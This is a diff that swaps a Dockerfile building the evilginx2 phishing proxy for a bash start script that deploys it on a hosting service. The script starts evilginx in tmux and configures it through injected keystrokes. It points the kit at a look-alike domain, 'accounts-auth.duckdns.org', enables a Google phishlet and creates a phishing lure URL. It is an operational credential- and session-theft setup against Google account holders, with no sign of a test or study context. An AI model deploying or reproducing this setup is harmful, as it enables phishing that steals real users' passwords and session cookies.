@@ -1,20 +1,24 @@
-FROM golang:1.23-alpine AS builder
-RUN apk add --no-cache git make gcc musl-dev
-RUN git clone https://github.com/kgretzky/evilginx2.git
-WORKDIR /go/evilginx2
-RUN make
+#!/bin/bash
 
-FROM alpine:latest
-# Added tmux here:
-RUN apk add --no-cache ca-certificates socat bash util-linux tmux
-WORKDIR /app
-COPY --from=builder /go/evilginx2/build/evilginx /app/evilginx
-COPY start.sh /app/start.sh
-RUN chmod +x /app/start.sh
-COPY phishlets/ /app/phishlets/
+# 1. Bridge Render's port to Evilginx's port (hide the annoying errors)
+socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 > /dev/null 2>&1 &
 
-EXPOSE 80 443
+# 2. Start Evilginx in a detached tmux session
+tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'
 
-USER root
+# 3. Wait for it to boot
+sleep 3
 
-CMD ["/app/start.sh"]
+# 4. Send the configuration commands (using C-m which is the tmux equivalent of Enter)
+tmux send-keys -t evilginx "config domain accounts-auth.duckdns.org" C-m
+tmux send-keys -t evilginx "config ipv4 external 127.0.0.1" C-m
+tmux send-keys -t evilginx "phishlets hostname google accounts-auth.duckdns.org" C-m
+tmux send-keys -t evilginx "phishlets enable google" C-m
+tmux send-keys -t evilginx "lures create google" C-m
+tmux send-keys -t evilginx "lures get-url 0" C-m
+
+# 5. Pipe the tmux output to a log file
+tmux pipe-pane -t evilginx -o 'cat > /tmp/evilginx.log'
+
+# 6. Keep the container alive and print the logs to Render
+tail -f /tmp/evilginx.log
